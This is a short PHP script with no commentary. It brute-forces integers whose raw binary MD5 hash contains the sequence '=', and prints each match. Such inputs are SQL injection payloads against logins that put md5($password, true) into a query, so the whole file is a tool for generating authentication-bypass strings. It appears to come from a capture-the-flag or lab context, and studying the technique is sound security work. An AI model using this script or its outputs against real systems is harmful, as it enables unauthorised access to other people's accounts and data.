<?php 
for ($i = 0;$i < 9e6;$i++) { 
	if (stripos(md5($i, true), "'='") !== false)
		echo "md5($i) = " . md5($i, true)."</br>";
}
?>